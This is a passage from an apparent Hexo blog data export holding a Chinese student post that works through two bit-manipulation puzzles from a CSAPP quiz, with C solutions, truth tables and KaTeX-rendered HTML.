整数的偶数bit位的顺序颠倒，再返回。\n\n用分治就好了\n\n```C\nuint32_t reverseEvenBits(uint32_t x) {\n    int odd_bits = x & 0xaaaaaaaa;\n    x = x & 0x55555555;\n    int mask_16 = 0x0000ffff;\n    x = ((x >> 16) & mask_16) | ((x & mask_16) << 16);\n    int mask_8 = 0x00ff00ff;\n    x = ((x >> 8) & mask_8) | ((x & mask_8) << 8);\n    int mask_4 = 0x0f0f0f0f;\n    x = ((x >> 4) & mask_4) | ((x & mask_4) << 4);\n    int mask_2 = 0x33333333;\n    x = ((x >> 2) & mask_2) | ((x & mask_2) << 2);\n    \n    return odd_bits | x;\n}\n```\n## 一个数组，除了唯一的一个元素只出现一次以外，其他元素都出现三次，找出这个元素。\n**只能用bit operations，而且不能用左右移，最多用4个local variables。**\n\n这是一道很珍贵的题，我想把它好好记录一下。\n\n把这道题简化，对于一个单bit数组，数组中的1要么出现$3n$次和$3n+1$次。\n\n在遍历的过程中，1的出现个数要么是$3n$、$3n+1$和$3n+2$次。3个状态则需要2个bit来表示，那我只需要引入两个单bit变量`high`和`low`就好了，构造状态表：\n\n| 状态 (high+low) | 1出现的次数 |\n| --------------- | ----------- |\n| 00              | 3n          |\n| 01              | 3n+1        |\n| 10              | 3n+2        |\n\n最终，只需要把low给提出来，就知道只出现1次的是1还是0了。可以写出状态转移的真值表：\n\n|   Before   |      |      | After |      |\n| ---- | ---- | ---- | ---- | ---- |\n| High | Low | Input | High | Low |\n| 0 | 0 | 0 | 0 | 0 |\n| 0 | 1 | 0 | 0 | 1 |\n| 1 | 0 | 0 | 1 | 0 |\n| 0 | 0 | 1 | 0 | 1 |\n| 0 | 1 | 1 | 1 | 0 |\n| 1 | 0 | 1 | 0 | 0 |\n\n表达式也可以用布尔代数写出来\n\n$$\nhigh=high \\land \\lnot low \\land \\lnot input \\lor \\lnot high \\land low \\land input\\\\\nlow = \\lnot hight \\land \\left(low \\oplus input \\right)\n$$\n\n**但事实上，以上所说的所有事情，都可以完全扩展到32位，不管是变量`high`还是`low`**。因为可以把一个32位的int看成32个独立的bit，并且并行地去处理每个bit。所以答案就出来了。\n\n\n```C\nint singleNumber(int *nums, int numSize) {\n    int low = 0, high = 0;\n    int orig_low;\n    for (int i = 0; i < numSize; i++) {\n        orig_low = low;\n        low = ~high & (low ^ nums[i]);\n        high = (high & ~orig_low & ~nums[i]) | (~high & orig_low &nums[i]);\n    }\n    return low;\n}\n```","source":"_posts/两道有点麻烦的算法题.md","raw":"---\ntitle: 两道有点麻烦的算法题\ntop_img: false\ncover: /img/CSAPP.jpeg\ndate: 2020-11-05 10:13:51\ntags:\n- CSAPP\n- C Programming\nkatex: true\n---\n\n昨天做ICS quiz 1的时候有两道题没做出来，在这里记一下。\n\n## 不用control flow logics（循环、分支）把输入的32-bit 整数的偶数bit位的顺序颠倒，再返回。\n\n用分治就好了\n\n```C\nuint32_t reverseEvenBits(uint32_t x) {\n    int odd_bits = x & 0xaaaaaaaa;\n    x = x & 0x55555555;\n    int mask_16 = 0x0000ffff;\n    x = ((x >> 16) & mask_16) | ((x & mask_16) << 16);\n    int mask_8 = 0x00ff00ff;\n    x = ((x >> 8) & mask_8) | ((x & mask_8) << 8);\n    int mask_4 = 0x0f0f0f0f;\n    x = ((x >> 4) & mask_4) | ((x & mask_4) << 4);\n    int mask_2 = 0x33333333;\n    x = ((x >> 2) & mask_2) | ((x & mask_2) << 2);\n    \n    return odd_bits | x;\n}\n```\n## 一个数组，除了唯一的一个元素只出现一次以外，其他元素都出现三次，找出这个元素。\n**只能用bit operations，而且不能用左右移，最多用4个local variables。**\n\n这是一道很珍贵的题，我想把它好好记录一下。\n\n把这道题简化，对于一个单bit数组，数组中的1要么出现$3n$次和$3n+1$次。\n\n在遍历的过程中，1的出现个数要么是$3n$、$3n+1$和$3n+2$次。3个状态则需要2个bit来表示，那我只需要引入两个单bit变量`high`和`low`就好了，构造状态表：\n\n| 状态 (high+low) | 1出现的次数 |\n| --------------- | ----------- |\n| 00              | 3n          |\n| 01              | 3n+1        |\n| 10              | 3n+2        |\n\n最终，只需要把low给提出来，就知道只出现1次的是1还是0了。可以写出状态转移的真值表：\n\n|   Before   |      |      | After |      |\n| ---- | ---- | ---- | ---- | ---- |\n| High | Low | Input | High | Low |\n| 0 | 0 | 0 | 0 | 0 |\n| 0 | 1 | 0 | 0 | 1 |\n| 1 | 0 | 0 | 1 | 0 |\n| 0 | 0 | 1 | 0 | 1 |\n| 0 | 1 | 1 | 1 | 0 |\n| 1 | 0 | 1 | 0 | 0 |\n\n表达式也可以用布尔代数写出来\n\n$$\nhigh=high \\land \\lnot low \\land \\lnot input \\lor \\lnot high \\land low \\land input\\\\\nlow = \\lnot hight \\land \\left(low \\oplus input \\right)\n$$\n\n**但事实上，以上所说的所有事情，都可以完全扩展到32位，不管是变量`high`还是`low`**。因为可以把一个32位的int看成32个独立的bit，并且并行地去处理每个bit。所以答案就出来了。\n\n\n```C\nint singleNumber(int *nums, int numSize) {\n    int low = 0, high = 0;\n    int orig_low;\n    for (int i = 0; i < numSize; i++) {\n        orig_low = low;\n        low = ~high & (low ^ nums[i]);\n        high = (high & ~orig_low & ~nums[i]) | (~high & orig_low &nums[i]);\n    }\n    return low;\n}\n```","slug":"两道有点麻烦的算法题","published":1,"updated":"2020-11-11T15:05:24.780Z","_id":"ckiszi5a6000798wa2ducgzkh","comments":1,"layout":"post","photos":[],"link":"","content":"<p>昨天做ICS quiz 1的时候有两道题没做出来，在这里记一下。</p>\n<h2 id=\"不用control-flow-logics循环-分支把输入的32-bit-整数的偶数bit位的顺序颠倒再返回\"><a class=\"markdownIt-Anchor\" href=\"#不用control-flow-logics循环-分支把输入的32-bit-整数的偶数bit位的顺序颠倒再返回\"></a> 不用control flow logics（循环、分支）把输入的32-bit 整数的偶数bit位的顺序颠倒，再返回。</h2>\n<p>用分治就好了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint32_t</span> <span class=\"title\">reverseEvenBits</span><span class=\"params\">(<span class=\"keyword\">uint32_t</span> x)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> odd_bits = x &amp; <span class=\"number\">0xaaaaaaaa</span>;</span><br><span class=\"line\">    x = x &amp; <span class=\"number\">0x55555555</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mask_16 = <span class=\"number\">0x0000ffff</span>;</span><br><span class=\"line\">    x = ((x &gt;&gt; <span class=\"number\">16</span>) &amp; mask_16) | ((x &amp; mask_16) &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mask_8 = <span class=\"number\">0x00ff00ff</span>;</span><br><span class=\"line\">    x = ((x &gt;&gt; <span class=\"number\">8</span>) &amp; mask_8) | ((x &amp; mask_8) &lt;&lt; <span class=\"number\">8</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mask_4 = <span class=\"number\">0x0f0f0f0f</span>;</span><br><span class=\"line\">    x = ((x &gt;&gt; <span class=\"number\">4</span>) &amp; mask_4) | ((x &amp; mask_4) &lt;&lt; <span class=\"number\">4</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mask_2 = <span class=\"number\">0x33333333</span>;</span><br><span class=\"line\">    x = ((x &gt;&gt; <span class=\"number\">2</span>) &amp; mask_2) | ((x &amp; mask_2) &lt;&lt; <span class=\"number\">2</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> odd_bits | x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"一个数组除了唯一的一个元素只出现一次以外其他元素都出现三次找出这个元素\"><a class=\"markdownIt-Anchor\" href=\"#一个数组除了唯一的一个元素只出现一次以外其他元素都出现三次找出这个元素\"></a> 一个数组，除了唯一的一个元素只出现一次以外，其他元素都出现三次，找出这个元素。</h2>\n<p><strong>只能用bit operations，而且不能用左右移，最多用4个local variables。</strong></p>\n<p>这是一道很珍贵的题，我想把它好好记录一下。</p>\n<p>把这道题简化，对于一个单bit数组，数组中的1要么出现<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">3n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span></span></span></span>次和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">3n+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span>次。</p>\n<p>在遍历的过程中，1的出现个数要么是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">3n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span></span></span></span>、<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">3n+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi><mo>+</mo><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">3n+2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span></span></span></span>次。3个状态则需要2个bit来表示，那我只需要引入两个单bit变量<code>high</code>和<code>low</code>就好了，构造状态表：</p>\n<table>\n<thead>\n<tr>\n<th>状态 (high+low)</th>\n<th>1出现的次数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>00</td>\n<td>3n</td>\n</tr>\n<tr>\n<td>01</td>\n<td>3n+1</td>\n</tr>\n<tr>\n<td>10</td>\n<td>3n+2</td>\n</tr>\n</tbody>\n</table>\n<p>最终，只需要把low给提出来，就知道只出现1次的是1还是0了。可以写出状态转移的真值表：</p>\n<table>\n<thead>\n<tr>\n<th>Before</th>\n<th></th>\n<th></th>\n<th>After</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>High</td>\n<td>Low</td>\n<td>Input</td>\n<td>High</td>\n<td>Low</td>\n</tr>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n</tr>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n<td>1</td>\n</tr>\n<tr>\n<td>0</td>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>0</td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n<td>0</td>\n</tr>\n</tbody>\n</table>\n<p>表达式也可以用布尔代数写出来</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>=</mo><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>∧</mo><mi mathvariant=\"normal\">¬</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo>∧</mo><mi mathvariant=\"normal\">¬</mi><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mo>∨</mo><mi mathvariant=\"normal\">¬</mi><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>∧</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo>∧</mo><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mspace linebreak=\"newline\"></mspace><mi>l</mi><mi>o</mi><mi>w</mi><mo>=</mo><mi mathvariant=\"normal\">¬</mi><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo>∧</mo><mrow><mo fence=\"true\">(</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo>⊕</mo><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">high=high \\land \\lnot low \\land \\lnot input \\lor \\lnot high \\land low \\land input\\\\\nlow = \\lnot hight \\land \\left(low \\oplus input \\right)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathdefault\">h</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathdefault\">h</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">¬</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord\">¬</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">t</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∨</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\">¬</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathdefault\">h</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">t</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\">¬</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">t</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\" style=\"margin-right:0.02691em;\">w</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">p</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\">t</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span></span></p>\n<p><strong>但事实上，以上所说的所有事情，都可以完全扩展到32位，不管是变量<code>high</code>还是<code>low</code></strong>。因为可以把一个32位的int看成32个独立的bit，并且并行地去处理每个bit。所以答案就出来了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">singleNumber</span><span class=\"params\">(<span class=\"keyword\">int</span> *nums, <span class=\"keyword\">int</span> numSize)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> low = <span class=\"number\">0</span>, high = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> orig_low;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; numSize; i++) &#123;</span><br><span class=\"line\">        orig_low = low;</span><br><span class=\"line\">        low = ~high &amp; (low ^ nums[i]);</span><br><span class=\"line\">        high = (high &amp; ~orig_low &amp; ~nums[i]) | (~high &amp; orig_low &amp;nums[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> low;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>昨天做ICS quiz 1的时候有两道题没做出来，在这里记一下。</p>\n<h2 id=\"不用control-flow-logics循环-分支把输入的32-bit-整数的偶数bit位的顺序颠倒再返回\"><a class=\"markdownIt-Anchor\" href=\"#不用control-flow-logics循环-分支把输入的32-bit-整数的偶数bit位的顺序颠倒再返回\"></a> 不用control flow logics（循环、分支）把输入的32-bit 整数的偶数bit位的顺序颠倒，再返回。</h2>\n<p>用分治就好了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">uint32_t</span> <span class=\"title\">reverseEvenBits</span><span class=\"params\">(<span class=\"keyword\">uint32_t</span> x)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> odd_bits = x &amp; <span class=\"number\">0xaaaaaaaa</span>;</span><br><span class=\"line\">    x = x &amp; <span class=\"number\">0x55555555</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mask_16 = <span class=\"number\">0x0000ffff</span>;</span><br><span class=\"line\">    x = ((x &gt;&gt; <span class=\"number\">16</span>) &amp; mask_16) | ((x &amp; mask_16) &lt;&lt; <span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mask_8 = <span class=\"number\">0x00ff00ff</span>;</span><br><span class=\"line\">    x = ((x &gt;&gt; <span class=\"number\">8</span>) &amp; mask_8) | ((x &amp; mask_8) &lt;&lt; <span class=\"number\">8</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mask_4 = <span class=\"number\">0x0f0f0f0f</span>;</span><br><span class=\"line\">    x = ((x &gt;&gt; <span class=\"number\">4</span>) &amp; mask_4) | ((x &amp; mask_4) &lt;&lt; <span class=\"number\">4</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mask_2 = <span class=\"number\">0x33333333</span>;</span><br><span class=\"line\">    x = ((x &gt;&gt; <span class=\"number\">2</span>) &amp; mask_2) | ((x &amp; mask_2) &lt;&lt; <span class=\"number\">2</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> odd_bits | x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"一个数组除了唯一的一个元素只出现一次以外其他元素都出现三次找出这个元素\"><a class=\"markdownIt-Anchor\" href=\"#一个数组除了唯一的一个元素只出现一次以外其他元素都出现三次找出这个元素\"></a> 一个数组，除了唯一的一个元素只出现一次以外，其他元素都出现三次，找出这个元素。</h2>\n<p><strong>只能用bit operations，而且不能用左右移，最多用4个local variables。</strong></p>\n<p>这是一道很珍贵的题，我想把它好好记录一下。</p>\n<p>把这道题简化，对于一个单bit数组，数组中的1要么出现<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">3n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span></span></span></span>次和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">3n+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span>次。</p>\n<p>在遍历的过程中，1的出现个数要么是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">3n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span></span></span></span>、<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">3n+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mn>3</mn><mi>n</mi><mo>+</mo><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">3n+2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mord mathdefault\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span></span></span></span>次。3个状态则需要2个bit来表示，那我只需要引入两个单bit变量<code>high</code>和<code>low</code>就好了，构造状态表：</p>\n<table>\n<thead>\n<tr>\n<th>状态 (high+low)</th>\n<th>1出现的次数</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>00</td>\n<td>3n</td>\n</tr>\n<tr>\n<td>01</td>\n<td>3n+1</td>\n</tr>\n<tr>\n<td>10</td>\n<td>3n+2</td>\n</tr>\n</tbody>\n</table>\n<p>最终，只需要把low给提出来，就知道只出现1次的是1还是0了。可以写出状态转移的真值表：</p>\n<table>\n<thead>\n<tr>\n<th>Before</th>\n<th></th>\n<th></th>\n<th>After</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>High</td>\n<td>Low</td>\n<td>Input</td>\n<td>High</td>\n<td>Low</td>\n</tr>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n</tr>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n<td>1</td>\n</tr>\n<tr>\n<td>0</td>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>0</td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n<td>0</td>\n</tr>\n</tbody>\n</table>\n<p>表达式也可以用布尔代数写出来</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>=</mo><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>∧</mo><mi mathvariant=\"normal\">¬</mi><mi>l</mi><mi>o</mi><mi>w</mi><mo>∧</mo><mi mathvariant=\"normal\">¬</mi><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mo>∨</mo><mi mathvariant=\"normal\">¬</mi><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo>∧</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo>∧</mo><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mspace linebreak=\"newline\"></mspace><mi>l</mi><mi>o</mi><mi>w</mi><mo>=</mo><mi mathvariant=\"normal\">¬</mi><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo>∧</mo><mrow><mo 